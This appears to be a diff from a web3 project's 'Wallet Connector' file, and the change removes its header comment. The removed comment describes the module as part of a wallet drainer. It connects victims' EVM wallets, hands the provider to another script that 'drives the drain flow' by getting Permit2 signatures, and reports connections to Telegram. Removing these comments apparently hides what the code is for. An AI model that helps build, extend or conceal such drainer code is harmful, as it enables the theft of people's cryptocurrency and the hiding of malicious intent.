@@ -1,26 +1,3 @@
-// ============================================================================
-//  Apex Protocol — Wallet Connector
-//  ---------------------------------------------------------------------------
-//  Responsibilities:
-//    1. Discover & connect EVM wallets (injected via EIP-6963, or WalletConnect v2)
-//    2. Persist / restore sessions across reloads
-//    3. Publish window.__apexConnected so script.js can drive the drain flow
-//    4. Handle provider lifecycle: accountsChanged, chainChanged, disconnect
-//    5. Report connections to Telegram
-//    6. Provide a debug panel (double-click) for troubleshooting
-//
-//  Design notes:
-//    - The `activeProvider` module variable is the single source of truth for
-//      the current EIP-1193 provider. It is set on every successful connect
-//      path (direct EVM, WalletConnect, restore) and cleared on disconnect.
-//    - `publishGlobalState()` copies `activeProvider` into
-//      `window.__apexConnected.provider`, so script.js can sign Permit2 typed
-//      data through the correct wallet even on WalletConnect sessions.
-//    - No library import happens at module top-level; WalletConnect libraries
-//      are dynamically imported with CDN fallbacks to keep the initial page
-//      load light and resilient.
-// ============================================================================
-
 import { CONFIG } from './config.js';
 
 ;(async function () {
